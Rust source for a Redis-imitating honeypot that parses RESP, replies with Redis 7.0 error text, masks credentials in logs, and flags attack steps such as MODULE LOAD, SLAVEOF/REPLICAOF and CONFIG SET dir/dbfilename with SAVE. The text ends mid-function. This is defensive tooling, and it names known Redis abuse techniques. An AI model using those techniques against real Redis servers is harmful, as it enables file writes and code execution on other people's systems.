//! A Redis-like emulator (#30): RESP2 and inline commands, a small command
//! subset, and replies that match Redis 7.0 wording.
//!
//! It is not Redis. There is no persistence, no Lua, no module loader and no
//! replication: `MODULE LOAD` is refused with the real error text, `SLAVEOF`
//! and `REPLICAOF` are acknowledged and logged but never connect anywhere,
//! and `CONFIG SET dir`/`dbfilename` are recorded as suspicious. Every size
//! is capped so a hostile client cannot make it allocate without bound.
//!
//! Credentials never reach a capture event: AUTH logs only a hash and a
//! length, and every other credential argument (`HELLO ... AUTH`,
//! `MIGRATE ... AUTH`, `CONFIG SET requirepass`, `ACL SETUSER` rules, secret
//! keywords in unknown commands) is masked in `args`, `error`, `config_set`
//! and hook notes, with its hash and length in `redacted_args`. Replies to
//! the client are unchanged. The positions come from
//! `foiled_core::redact::secret_arg_positions`, so events and IOCs agree.

use std::collections::BTreeMap;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use foiled_core::capture::{HookEvent, Severity};
use foiled_core::redact::{mask_secret_arg, secret_arg_positions};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value, json};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::profile::{HookPoint, Profile};
use crate::server::{Server, Session};
use crate::sink::{Event, EventSink};
use crate::util::{Rng, clip, glob_match, sha256_hex};
use crate::{BoxFuture, Emulator, EmulatorError, Health, Jitter};

pub const PLUGIN: &str = "redis";

/// Most elements in one multibulk request.
pub const MAX_ARGS: usize = 64;
/// Largest bulk string accepted (Redis allows 512 MB).
pub const MAX_BULK: usize = 64 * 1024;
/// Longest inline command line.
pub const MAX_INLINE: usize = 16 * 1024;
/// Unparsed bytes a connection may hold before it is closed, as Redis does
/// when a client passes `client-query-buffer-limit`.
pub const MAX_QUERY_BUFFER: usize = 512 * 1024;
/// Keys the fake keyspace holds. Further `SET`s answer `OK` but store nothing.
pub const MAX_KEYS: usize = 1024;
/// Bytes of each argument kept in an event.
const ARG_CLIP: usize = 256;
/// Longest error text kept in an event.
const ERROR_CLIP: usize = 256;
/// Error text kept before masking. Every error message is far shorter (the
/// longest echoes 8 arguments of at most 128 characters), so masking always
/// sees whole arguments.
const ERROR_BOUND: usize = 4096;
/// Arguments kept in an event.
const LOG_ARGS: usize = 8;

/// Commands this plug-in implements. A profile enables a subset.
pub const SUPPORTED: &[&str] = &[
    "AUTH",
    "BGSAVE",
    "COMMAND",
    "CONFIG",
    "DBSIZE",
    "ECHO",
    "FLUSHALL",
    "GET",
    "INFO",
    "KEYS",
    "MODULE",
    "PING",
    "QUIT",
    "REPLICAOF",
    "SAVE",
    "SELECT",
    "SET",
    "SLAVEOF",
];

/// Placeholders allowed in INFO field values, filled at reply time.
pub const INFO_TOKENS: &[&str] = &[
    "process_id",
    "run_id",
    "tcp_port",
    "uptime_in_seconds",
    "uptime_in_days",
    "server_time_usec",
    "lru_clock",
    "connected_clients",
    "total_connections_received",
    "total_commands_processed",
    "used_memory",
    "used_memory_human",
    "rdb_changes_since_last_save",
    "rdb_last_save_time",
];

/// INFO sections the emulator writes itself from its state.
const GENERATED_SECTIONS: &[&str] = &["Replication", "Keyspace"];

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RedisSettings {
    /// The version the persona claims; must match `redis_version` in INFO.
    pub version: String,
    /// Enabled commands, from [`SUPPORTED`]. Anything else gets Redis's
    /// "unknown command" error.
    pub commands: Vec<String>,
    /// INFO sections in output order. `Replication` and `Keyspace` are
    /// generated and must have no fields.
    pub info: Vec<InfoSection>,
    /// INFO uptime starts at a random value in this range (FR-11), so a
    /// fresh decoy does not always report a few seconds of uptime.
    pub uptime_offset_s: SecondsRange,
    /// Parameters `CONFIG GET` reports and `CONFIG SET` accepts.
    pub config: BTreeMap<String, String>,
    /// Parameters Redis 7.0 marks as protected.
    #[serde(default)]
    pub protected_config: Vec<String>,
    /// Whether `CONFIG SET` may change protected parameters. Must agree with
    /// the `enable-protected-configs` value in `config`.
    pub allow_protected_config_set: bool,
    /// `CONFIG SET` of these is logged as `high` severity.
    #[serde(default)]
    pub suspicious_config: Vec<String>,
    /// Seed keyspace. Synthetic values and canary placeholders only.
    #[serde(default)]
    pub keys: BTreeMap<String, String>,
    /// Idle connections are closed after this many seconds.
    #[serde(default = "default_idle")]
    pub idle_timeout_s: u32,
}

fn default_idle() -> u32 {
    300
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct InfoSection {
    pub section: String,
    /// `name:value` lines. Values may hold `{token}` placeholders from
    /// [`INFO_TOKENS`].
    #[serde(default)]
    pub fields: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SecondsRange {
    pub min: u64,
    pub max: u64,
}

fn tokens_in(s: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut rest = s;
    while let Some(start) = rest.find('{') {
        let after = &rest[start + 1..];
        match after.find('}') {
            Some(end) => {
                out.push(&after[..end]);
                rest = &after[end + 1..];
            }
            None => break,
        }
    }
    out
}

impl RedisSettings {
    pub fn problems(&self) -> Vec<String> {
        let mut out = Vec::new();
        if self.version.trim().is_empty() {
            out.push("redis.version is empty".into());
        }
        for c in &self.commands {
            if !SUPPORTED.contains(&c.as_str()) {
                out.push(format!("redis command '{c}' is not implemented"));
            }
        }
        let version_line = format!("redis_version:{}", self.version);
        if !self
            .info
            .iter()
            .any(|s| s.section == "Server" && s.fields.contains(&version_line))
        {
            out.push(format!("INFO Server section must contain '{version_line}'"));
        }
        for s in &self.info {
            let generated = GENERATED_SECTIONS.contains(&s.section.as_str());
            if generated && !s.fields.is_empty() {
                out.push(format!(
                    "INFO section {} is generated; leave fields empty",
                    s.section
                ));
            }
            for f in &s.fields {
                let Some((name, value)) = f.split_once(':') else {
                    out.push(format!("INFO field '{f}' is not name:value"));
                    continue;
                };
                if name.is_empty()
                    || !name
                        .chars()
                        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_')
                {
                    out.push(format!("INFO field name '{name}' is not [a-z0-9_]+"));
                }
                for t in tokens_in(value) {
                    if !INFO_TOKENS.contains(&t) {
                        out.push(format!("INFO field '{name}' uses unknown token {{{t}}}"));
                    }
                }
            }
        }
        if self.uptime_offset_s.min > self.uptime_offset_s.max {
            out.push("redis.uptime_offset_s min is above max".into());
        }
        for name in self.protected_config.iter().chain(&self.suspicious_config) {
            if !self.config.contains_key(name) {
                out.push(format!("'{name}' is not in redis.config"));
            }
        }
        for name in self.config.keys() {
            if name != &name.to_ascii_lowercase() {
                out.push(format!("config name '{name}' must be lower case"));
            }
        }
        let flag = if self.allow_protected_config_set {
            "yes"
        } else {
            "no"
        };
        if !self.protected_config.is_empty()
            && self
                .config
                .get("enable-protected-configs")
                .map(String::as_str)
                != Some(flag)
        {
            out.push(format!(
                "allow_protected_config_set needs enable-protected-configs: \"{flag}\" in redis.config"
            ));
        }
        if self.keys.len() > MAX_KEYS {
            out.push(format!("more than {MAX_KEYS} seed keys"));
        }
        if !(1..=3600).contains(&self.idle_timeout_s) {
            out.push("redis.idle_timeout_s must be 1..=3600".into());
        }
        out
    }
}

// ---------------------------------------------------------------------------
// RESP parsing

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProtocolError {
    InvalidMultibulkLength,
    InvalidBulkLength,
    ExpectedDollar(u8),
    TooBigMbulkCount,
    TooBigBulkCount,
    TooBigInline,
    UnbalancedQuotes,
}

impl ProtocolError {
    /// The error line Redis sends before closing the connection.
    pub fn reply(&self) -> String {
        let detail = match self {
            ProtocolError::InvalidMultibulkLength => "invalid multibulk length".to_string(),
            ProtocolError::InvalidBulkLength => "invalid bulk length".to_string(),
            ProtocolError::ExpectedDollar(b) => {
                format!("expected '$', got '{}'", char::from(*b).escape_default())
            }
            ProtocolError::TooBigMbulkCount => "too big mbulk count string".to_string(),
            ProtocolError::TooBigBulkCount => "too big bulk count string".to_string(),
            ProtocolError::TooBigInline => "too big inline request".to_string(),
            ProtocolError::UnbalancedQuotes => "unbalanced quotes in request".to_string(),
        };
        format!("-ERR Protocol error: {detail}\r\n")
    }
}

fn find_crlf(buf: &[u8], limit: usize) -> Option<usize> {
    buf.iter()
        .take(limit)
        .zip(buf.iter().skip(1))
        .position(|(&a, &b)| a == b'\r' && b == b'\n')
}

fn parse_int(digits: &[u8]) -> Option<i64> {
    let (neg, digits) = match digits.split_first() {
        Some((b'-', rest)) => (true, rest),
        _ => (false, digits),
    };
    if digits.is_empty() || digits.len() > 18 || !digits.iter().all(u8::is_ascii_digit) {
        return None;
    }
    let v = digits
        .iter()
        .fold(0i64, |acc, d| acc * 10 + i64::from(d - b'0'));
    Some(if neg { -v } else { v })
}

/// A parsed command and the bytes it used, or `None` when more are needed.
pub type Parsed = Option<(Vec<Vec<u8>>, usize)>;

/// Parse one command from the front of `buf`. `Ok(None)` means more bytes
/// are needed. On success returns the arguments and the bytes consumed; an
/// empty argument list is a no-op (for example `*0` or a blank line).
pub fn parse_command(buf: &[u8]) -> Result<Parsed, ProtocolError> {
    match buf.first() {
        None => Ok(None),
        Some(b'*') => parse_multibulk(buf),
        Some(_) => parse_inline(buf),
    }
}

fn parse_multibulk(buf: &[u8]) -> Result<Parsed, ProtocolError> {
    const COUNT_LIMIT: usize = 32;
    let Some(end) = find_crlf(buf, COUNT_LIMIT) else {
        return if buf.len() > COUNT_LIMIT {
            Err(ProtocolError::TooBigMbulkCount)
        } else {
            Ok(None)
        };
    };
    let count = parse_int(&buf[1..end]).ok_or(ProtocolError::InvalidMultibulkLength)?;
    if count > MAX_ARGS as i64 {
        return Err(ProtocolError::InvalidMultibulkLength);
    }
    let mut pos = end + 2;
    if count <= 0 {
        return Ok(Some((Vec::new(), pos)));
    }
    let mut args = Vec::with_capacity(count as usize);
    for _ in 0..count {
        let rest = &buf[pos..];
        match rest.first() {
            None => return Ok(None),
            Some(b'$') => {}
            Some(&other) => return Err(ProtocolError::ExpectedDollar(other)),
        }
        let Some(end) = find_crlf(rest, COUNT_LIMIT) else {
            return if rest.len() > COUNT_LIMIT {
                Err(ProtocolError::TooBigBulkCount)
            } else {
                Ok(None)
            };
        };
        let len = parse_int(&rest[1..end]).ok_or(ProtocolError::InvalidBulkLength)?;
        if len < 0 || len as usize > MAX_BULK {
            return Err(ProtocolError::InvalidBulkLength);
        }
        let len = len as usize;
        let start = pos + end + 2;
        // Redis skips the two bytes after the payload without checking them.
        if buf.len() < start + len + 2 {
            return Ok(None);
        }
        args.push(buf[start..start + len].to_vec());
        pos = start + len + 2;
    }
    Ok(Some((args, pos)))
}

fn parse_inline(buf: &[u8]) -> Result<Parsed, ProtocolError> {
    let Some(nl) = buf.iter().take(MAX_INLINE + 1).position(|&b| b == b'\n') else {
        return if buf.len() > MAX_INLINE {
            Err(ProtocolError::TooBigInline)
        } else {
            Ok(None)
        };
    };
    let mut line = &buf[..nl];
    if line.last() == Some(&b'\r') {
        line = &line[..line.len() - 1];
    }
    let args = split_args(line)?;
    if args.len() > MAX_ARGS {
        return Err(ProtocolError::TooBigInline);
    }
    Ok(Some((args, nl + 1)))
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Split an inline command the way Redis's `sdssplitargs` does: spaces
/// separate, double quotes allow escapes, single quotes do not.
fn split_args(line: &[u8]) -> Result<Vec<Vec<u8>>, ProtocolError> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < line.len() {
        while i < line.len() && line[i].is_ascii_whitespace() {
            i += 1;
        }
        if i >= line.len() {
            break;
        }
        let mut cur = Vec::new();
        match line[i] {
            b'"' => {
                i += 1;
                loop {
                    let Some(&c) = line.get(i) else {
                        return Err(ProtocolError::UnbalancedQuotes);
                    };
                    match c {
                        b'\\'
                            if i + 3 < line.len()
                                && line[i + 1] == b'x'
                                && hex_val(line[i + 2]).is_some()
                                && hex_val(line[i + 3]).is_some() =>
                        {
                            let hi = hex_val(line[i + 2]).unwrap_or(0);
                            let lo = hex_val(line[i + 3]).unwrap_or(0);
                            cur.push(hi * 16 + lo);
                            i += 4;
                        }
                        b'\\' if i + 1 < line.len() => {
                            cur.push(match line[i + 1] {
                                b'n' => b'\n',
                                b'r' => b'\r',
                                b't' => b'\t',
                                b'b' => 8,
                                b'a' => 7,
                                other => other,
                            });
                            i += 2;
                        }
                        b'"' => {
                            i += 1;
                            if line.get(i).is_some_and(|b| !b.is_ascii_whitespace()) {
                                return Err(ProtocolError::UnbalancedQuotes);
                            }
                            break;
                        }
                        other => {
                            cur.push(other);
                            i += 1;
                        }
                    }
                }
            }
            b'\'' => {
                i += 1;
                loop {
                    let Some(&c) = line.get(i) else {
                        return Err(ProtocolError::UnbalancedQuotes);
                    };
                    match c {
                        b'\\' if line.get(i + 1) == Some(&b'\'') => {
                            cur.push(b'\'');
                            i += 2;
                        }
                        b'\'' => {
                            i += 1;
                            if line.get(i).is_some_and(|b| !b.is_ascii_whitespace()) {
                                return Err(ProtocolError::UnbalancedQuotes);
                            }
                            break;
                        }
                        other => {
                            cur.push(other);
                            i += 1;
                        }
                    }
                }
            }
            _ => {
                while i < line.len() && !line[i].is_ascii_whitespace() {
                    cur.push(line[i]);
                    i += 1;
                }
            }
        }
        out.push(cur);
    }
    Ok(out)
}

// ---------------------------------------------------------------------------
// Replies

fn simple(s: &str) -> Vec<u8> {
    format!("+{s}\r\n").into_bytes()
}

fn error(s: &str) -> Vec<u8> {
    format!("-{s}\r\n").into_bytes()
}

fn bulk(b: &[u8]) -> Vec<u8> {
    let mut out = format!("${}\r\n", b.len()).into_bytes();
    out.extend_from_slice(b);
    out.extend_from_slice(b"\r\n");
    out
}

fn nil() -> Vec<u8> {
    b"$-1\r\n".to_vec()
}

fn integer(n: i64) -> Vec<u8> {
    format!(":{n}\r\n").into_bytes()
}

fn array<'a>(items: impl ExactSizeIterator<Item = &'a [u8]>) -> Vec<u8> {
    let mut out = format!("*{}\r\n", items.len()).into_bytes();
    for i in items {
        out.extend(bulk(i));
    }
    out
}

fn upper(b: &[u8]) -> String {
    clip(b, 64).to_ascii_uppercase()
}

/// Text from an attacker that ends up inside an INFO line: no control
/// characters, bounded length.
fn printable(b: &[u8], max: usize) -> String {
    clip(b, max)
        .chars()
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

// ---------------------------------------------------------------------------
// Command execution

/// Per-connection state.
#[derive(Debug)]
pub struct Conn {
    pub authed: bool,
    pub close: bool,
    started: Instant,
    hook_seq: u32,
    local_port: u16,
}

/// What one command did, for the reply and the event.
#[derive(Debug, Clone, PartialEq)]
pub struct Outcome {
    pub reply: Vec<u8>,
    pub severity: Severity,
    pub data: Map<String, Value>,
    /// The command passed auth and arity checks, so hooks may fire.
    pub reached: bool,
}

struct State {
    keys: BTreeMap<Vec<u8>, Vec<u8>>,
    config: BTreeMap<String, String>,
    replica_of: Option<(String, String)>,
    changes_since_save: u64,
    last_save_unix: i64,
    total_connections: u64,
    total_commands: u64,
    connected: usize,
}

/// Shared by every connection of one decoy.
pub struct Core {
    settings: RedisSettings,
    hooks: Vec<HookPoint>,
    jitter: Jitter,
    started: Instant,
    uptime_offset: u64,
    process_id: u64,
    run_id: String,
    replid: String,
    seed: u64,
    state: Mutex<State>,
    sink: EventSink,
}

fn unix_now() -> i64 {
    crate::sink::now_ms() / 1000
}

impl Core {
    pub fn new(profile: &Profile, sink: EventSink, rng: &mut Rng) -> Result<Self, EmulatorError> {
        if profile.plugin != PLUGIN {
            return Err(EmulatorError::WrongPlugin {
                expected: PLUGIN,
                got: profile.plugin.clone(),
            });
        }
        profile.check_ready()?;
        let settings = profile
            .redis
            .clone()
            .ok_or_else(|| crate::ProfileError::Invalid(vec!["missing redis section".into()]))?;
        let mut config = settings.config.clone();
        config
            .entry("requirepass".into())
            .or_insert_with(String::new);
        let keys = settings
            .keys
            .iter()
            .map(|(k, v)| (k.as_bytes().to_vec(), v.as_bytes().to_vec()))
            .collect();
        let now = unix_now();
        let uptime_offset = rng.range(settings.uptime_offset_s.min, settings.uptime_offset_s.max);
        Ok(Core {
            jitter: profile.jitter,
            hooks: profile.hooks.clone(),
            started: Instant::now(),
            uptime_offset,
            process_id: rng.range(300, 4_000_000),
            run_id: rng.hex(40),
            replid: rng.hex(40),
            seed: rng.next_u64(),
            state: Mutex::new(State {
                keys,
                config,
                replica_of: None,
                changes_since_save: 0,
                last_save_unix: now - (uptime_offset.min(86_400) as i64),
                total_connections: 0,
                total_commands: 0,
                connected: 0,
            }),
            sink,
            settings,
        })
    }

    fn state(&self) -> std::sync::MutexGuard<'_, State> {
        // A panic while holding the lock cannot leave the fake keyspace in a
        // state worth refusing service over.
        self.state.lock().unwrap_or_else(|p| p.into_inner())
    }

    /// A fresh connection.
    pub fn connect(&self, local_port: u16) -> Conn {
        let mut st = self.state();
        st.total_connections += 1;
        st.connected += 1;
        Conn {
            authed: st.config.get("requirepass").is_none_or(|p| p.is_empty()),
            close: false,
            started: Instant::now(),
            hook_seq: 0,
            local_port,
        }
    }

    pub fn disconnect(&self) {
        let mut st = self.state();
        st.connected = st.connected.saturating_sub(1);
    }

    fn enabled(&self, name: &str) -> bool {
        self.settings.commands.iter().any(|c| c == name)
    }

    /// Run one command. Never panics on any input. Credential arguments are
    /// masked in the outcome's data ([`scrub_secrets`]); the reply is not.
    pub fn execute(&self, conn: &mut Conn, args: &[Vec<u8>]) -> Outcome {
        let mut o = self.run_command(conn, args);
        scrub_secrets(&mut o.data, args);
        if let Some(Value::String(e)) = o.data.get_mut("error") {
            *e = clip(e.as_bytes(), ERROR_CLIP);
        }
        o
    }

    fn run_command(&self, conn: &mut Conn, args: &[Vec<u8>]) -> Outcome {
        let name = upper(&args[0]);
        let mut data = Map::new();
        data.insert("protocol".into(), json!("redis"));
        data.insert("command".into(), json!(name));
        let mut o = Outcome {
            reply: Vec::new(),
            severity: Severity::Info,
            data,
            reached: false,
        };
        self.state().total_commands += 1;

        if !self.enabled(&name) {
            let shown: String = args[1..]
                .iter()
                .take(LOG_ARGS)
                .map(|a| format!("'{}' ", printable(a, 128)))
                .collect();
            log_args(&mut o.data, &args[1..]);
            return self.fail(
                o,
                &format!(
                    "ERR unknown command '{}', with args beginning with: {shown}",
                    printable(&args[0], 128)
                ),
            );
        }
        if !conn.authed && !matches!(name.as_str(), "AUTH" | "QUIT") {
            log_args(&mut o.data, &args[1..]);
            return self.fail(o, "NOAUTH Authentication required.");
        }
        let (min, max) = arity(&name);
        if args.len() < min || max.is_some_and(|m| args.len() > m) {
            log_args(&mut o.data, &args[1..]);
            return self.fail(
                o,
                &format!(
                    "ERR wrong number of arguments for '{}' command",
                    name.to_ascii_lowercase()
                ),
            );
        }

        match name.as_str() {
            "AUTH" => self.auth(conn, args, o),
            "CONFIG" => self.config(args, o),
            "SET" => self.set(args, o),
            "MODULE" => self.module(args, o),
            "SLAVEOF" | "REPLICAOF" => self.replicaof(args, o),
            _ => {
                log_args(&mut o.data, &args[1..]);
                o.reached = true;
                o.reply = self.simple_command(conn, &name, args);
                if o.reply.first() == Some(&b'-') {
                    o.data.insert("result".into(), json!("error"));
                } else {
                    o.data.insert("result".into(), json!("ok"));
                }
                match name.as_str() {
                    "SAVE" | "BGSAVE" => {
                        let st = self.state();
                        let dir = st.config.get("dir").cloned().unwrap_or_default();
                        let file = st.config.get("dbfilename").cloned().unwrap_or_default();
                        let moved = Some(&dir) != self.settings.config.get("dir")
                            || Some(&file) != self.settings.config.get("dbfilename");
                        o.data
                            .insert("save_path".into(), json!(format!("{dir}/{file}")));
                        o.severity = if moved {
                            Severity::High
                        } else {
                            Severity::Medium
                        };
                    }
                    "FLUSHALL" => o.severity = Severity::Medium,
                    "KEYS" | "INFO" | "CONFIG" => o.severity = Severity::Low,
                    _ => {}
                }
                o
            }
        }
    }

    fn fail(&self, mut o: Outcome, msg: &str) -> Outcome {
        o.reply = error(msg);
        o.data.insert("result".into(), json!("error"));
        // Clipped to ERROR_CLIP only after credentials are masked
        // (`execute`), so a cut never lands inside a secret.
        o.data
            .insert("error".into(), json!(clip(msg.as_bytes(), ERROR_BOUND)));
        if o.severity < Severity::Low {
            o.severity = Severity::Low;
        }
        o
    }

    fn ok(&self, mut o: Outcome, reply: Vec<u8>) -> Outcome {
        o.reply = reply;
        o.reached = true;
        o.data.insert("result".into(), json!("ok"));
        o
    }

    fn simple_command(&self, conn: &mut Conn, name: &str, args: &[Vec<u8>]) -> Vec<u8> {
        match name {
            "PING" if args.len() == 1 => simple("PONG"),
            "PING" | "ECHO" => bulk(&args[1]),
            "QUIT" => {
                conn.close = true;
                simple("OK")
            }
            "COMMAND" => b"*0\r\n".to_vec(),
            "INFO" => bulk(self.info(&args[1..], conn.local_port).as_bytes()),
            "GET" => match self.state().keys.get(&args[1]) {
                Some(v) => bulk(v),
                None => nil(),
            },
            "KEYS" => {
                let st = self.state();
                let found: Vec<&[u8]> = st
                    .keys
                    .keys()
                    .filter(|k| glob_match(&args[1], k))
                    .take(MAX_KEYS)
                    .map(Vec::as_slice)
                    .collect();
                array(found.into_iter())
            }
            "DBSIZE" => integer(self.state().keys.len() as i64),
            "SELECT" => match parse_int(&args[1]) {
                Some(0..=15) => simple("OK"),
                Some(_) => error("ERR DB index is out of range"),
                None => error("ERR value is not an integer or out of range"),
            },
            "SAVE" => {
                let mut st = self.state();
                st.changes_since_save = 0;
                st.last_save_unix = unix_now();
                simple("OK")
            }
            "BGSAVE" => {
                let mut st = self.state();
                st.changes_since_save = 0;
                st.last_save_unix = unix_now();
                simple("Background saving started")
            }
            "FLUSHALL" => {
                let mut st = self.state();
                let n = st.keys.len() as u64;
                st.keys.clear();
                st.changes_since_save += n;
                simple("OK")
            }
            _ => error("ERR unknown command"),
        }
    }

    fn auth(&self, conn: &mut Conn, args: &[Vec<u8>], mut o: Outcome) -> Outcome {
        o.severity = Severity::Low;
        let (user, pass) = if args.len() == 3 {
            (args[1].as_slice(), args[2].as_slice())
        } else {
            (b"default".as_slice(), args[1].as_slice())
        };
        o.data.insert("username".into(), json!(printable(user, 64)));
        o.data
            .insert("password_sha256".into(), json!(sha256_hex(pass)));
        o.data.insert("password_len".into(), json!(pass.len()));
        let configured = self
            .state()
            .config
            .get("requirepass")
            .cloned()
            .unwrap_or_default();
        if configured.is_empty() {
            if args.len() == 2 {
                return self.fail(
                    o,
                    "ERR AUTH <password> called without any password configured for the default user. Are you sure your configuration is correct?",
                );
            }
            if user == b"default" {
                conn.authed = true;
                return self.ok(o, simple("OK"));
            }
        } else if user == b"default" && pass == configured.as_bytes() {
            conn.authed = true;
            return self.ok(o, simple("OK"));
        }
        self.fail(
            o,
            "WRONGPASS invalid username-password pair or user is disabled.",
        )
    }

    fn config(&self, args: &[Vec<u8>], mut o: Outcome) -> Outcome {
        let sub = upper(&args[1]);
        o.data.insert("subcommand".into(), json!(sub));
        log_args(&mut o.data, &args[2..]);
        let wrong = |me: &Self, o: Outcome, s: &str| {
            me.fail(
                o,
                &format!("ERR wrong number of arguments for 'config|{s}' command"),
            )
        };
        match sub.as_str() {
            "GET" => {
                if args.len() < 3 {
                    return wrong(self, o, "get");
                }
                o.severity = Severity::Low;
                let st = self.state();
                let mut seen = Vec::new();
                for pat in &args[2..] {
                    let pat = pat.to_ascii_lowercase();
                    for (k, v) in &st.config {
                        if glob_match(&pat, k.as_bytes()) && !seen.iter().any(|(s, _)| *s == k) {
                            seen.push((k, v));
                        }
                    }
                }
                let flat: Vec<&[u8]> = seen
                    .iter()
                    .flat_map(|(k, v)| [k.as_bytes(), v.as_bytes()])
                    .collect();
                let reply = array(flat.into_iter());
                drop(st);
                self.ok(o, reply)
            }
            "SET" => {
                if args.len() < 4 || !args.len().is_multiple_of(2) {
                    return wrong(self, o, "set");
                }
                let mut changes = Map::new();
                let mut severity = Severity::Medium;
                let mut st = self.state();
                let mut pending = Vec::new();
                for pair in args[2..].chunks(2) {
                    let name = printable(&pair[0], 128).to_ascii_lowercase();
                    let value = printable(&pair[1], 1024);
                    changes.insert(name.clone(), json!(value));
                    if !st.config.contains_key(&name) {
                        drop(st);
                        o.data.insert("config_set".into(), Value::Object(changes));
                        return self.fail(
                            o,
                            &format!(
                                "ERR Unknown option or number of arguments for CONFIG SET - '{name}'"
                            ),
                        );
                    }
                    if self.settings.suspicious_config.contains(&name) {
                        severity = Severity::High;
                    }
                    if self.settings.protected_config.contains(&name)
                        && !self.settings.allow_protected_config_set
                    {
                        drop(st);
                        o.severity = severity;
                        o.reached = true;
                        o.data.insert("config_set".into(), Value::Object(changes));
                        return self.fail(
                            o,
                            &format!(
                                "ERR CONFIG SET failed (possibly related to argument '{name}') - can't set protected config"
                            ),
                        );
                    }
                    pending.push((name, value));
                }
                for (k, v) in pending {
                    st.config.insert(k, v);
                }
                drop(st);
                o.severity = severity;
                o.data.insert("config_set".into(), Value::Object(changes));
                self.ok(o, simple("OK"))
            }
            "RESETSTAT" | "REWRITE" => {
                if args.len() != 2 {
                    return wrong(self, o, &sub.to_ascii_lowercase());
                }
                o.severity = Severity::Low;
                self.ok(o, simple("OK"))
            }
            _ => {
                let msg = format!(
                    "ERR unknown subcommand '{}'. Try CONFIG HELP.",
                    printable(&args[1], 128)
                );
                self.fail(o, &msg)
            }
        }
    }

    fn set(&self, args: &[Vec<u8>], mut o: Outcome) -> Outcome {
        let (key, value) = (&args[1], &args[2]);
        // Values are hashed, not kept in the event (#16). Markers say what
        // kind of payload it looks like without storing it.
        o.data.insert("args".into(), json!([clip(key, ARG_CLIP)]));
        o.data
            .insert("value_sha256".into(), json!(sha256_hex(value)));
        o.data.insert("value_len".into(), json!(value.len()));
        let markers = payload_markers(value);
        o.severity = if markers.is_empty() {
            Severity::Info
        } else {
            Severity::Medium
        };
        if !markers.is_empty() {
            o.data.insert("markers".into(), json!(markers));
        }
        let mut st = self.state();
        if st.keys.len() < MAX_KEYS || st.keys.contains_key(key) {
            st.keys.insert(key.clone(), value.clone());
        }
        st.changes_since_save += 1;
        drop(st);
        self.ok(o, simple("OK"))
    }

    fn module(&self, args: &[Vec<u8>], mut o: Outcome) -> Outcome {
        let sub = upper(&args[1]);
        o.data.insert("subcommand".into(), json!(sub));
        log_args(&mut o.data, &args[2..]);
        match (sub.as_str(), args.len()) {
            ("LOAD", n) if n >= 3 => {
                // Never loads anything. This is the real reply for a module
                // that fails to load.
                o.severity = Severity::High;
                o.reached = true;
                o.data
                    .insert("module_path".into(), json!(printable(&args[2], 512)));
                self.fail(
                    o,
                    "ERR Error loading the extension. Please check the server logs.",
                )
            }
            ("LIST", 2) => self.ok(o, b"*0\r\n".to_vec()),
            ("UNLOAD", 3) => self.fail(
                o,
                "ERR Error unloading module: no such module with that name",
            ),
            ("LOAD" | "LIST" | "UNLOAD", _) => {
                let msg = format!(
                    "ERR wrong number of arguments for 'module|{}' command",
                    sub.to_ascii_lowercase()
                );
                self.fail(o, &msg)
            }
            _ => {
                let msg = format!(
                    "ERR unknown subcommand '{}'. Try MODULE HELP.",
                    printable(&args[1], 128)
                );
                self.fail(o, &msg)
            }
        }
    }

    fn replicaof(&self, args: &[Vec<u8>], mut o: Outcome) -> Outcome {
        log_args(&mut o.data, &args[1..]);
        o.severity = Severity::High;
        let host = printable(&args[1], 128);
        let port = printable(&args[2], 16);
        if host.eq_ignore_ascii_case("no") && port.eq_ignore_ascii_case("one") {
            self.state().replica_of = None;
            o.severity = Severity::Medium;
            return self.ok(o, simple("OK"));
        }
        let Some(p) = parse_int(&args[2]).filter(|p| (0..=65_535).contains(p)) else {
            o.reached = true;
            return self.fail(o, "ERR Invalid master port");
        };
        o.data.insert("master_host".into(), json!(host));
        o.data.insert("master_port".into(), json!(p));
        // Logged only. The emulator never connects anywhere; egress is
        // denied by default (#4) in any case.
        self.state().replica_of = Some((host, p.to_string()));
        self.ok(o, simple("OK"))
    }

    /// The INFO text for the requested sections.
    pub fn info(&self, wanted: &[Vec<u8>], local_port: u16) -> String {
        let wanted: Vec<String> = wanted
            .iter()
            .map(|w| clip(w, 32).to_ascii_lowercase())
            .collect();
        let all = wanted.is_empty()
            || wanted
                .iter()
                .any(|w| matches!(w.as_str(), "all" | "everything" | "default"));
        let st = self.state();
        let now_ms = crate::sink::now_ms();
        let uptime = self.uptime_offset + self.started.elapsed().as_secs();
        let used_memory = 875_000
            + st.keys
                .iter()
                .map(|(k, v)| (k.len() + v.len() + 64) as u64)
                .sum::<u64>();
        let tokens: [(&str, String); 14] = [
            ("process_id", self.process_id.to_string()),
            ("run_id", self.run_id.clone()),
            ("tcp_port", local_port.to_string()),
            ("uptime_in_seconds", uptime.to_string()),
            ("uptime_in_days", (uptime / 86_400).to_string()),
            ("server_time_usec", (now_ms * 1000).to_string()),
            ("lru_clock", ((now_ms / 1000) & 0x00ff_ffff).to_string()),
            ("connected_clients", st.connected.max(1).to_string()),
            (
                "total_connections_received",
                (st.total_connections + self.seed % 900 + 40).to_string(),
            ),
            (
                "total_commands_processed",
                (st.total_commands + self.seed % 7_000 + 300).to_string(),
            ),
            ("used_memory", used_memory.to_string()),
            ("used_memory_human", human_bytes(used_memory)),
            (
                "rdb_changes_since_last_save",
                st.changes_since_save.to_string(),
            ),
            ("rdb_last_save_time", st.last_save_unix.to_string()),
        ];
        let mut sections = Vec::new();
        for s in &self.settings.info {
            if !all && !wanted.contains(&s.section.to_ascii_lowercase()) {
                continue;
            }
            let mut text = format!("# {}\r\n", s.section);
            let lines: Vec<String> = match s.section.as_str() {
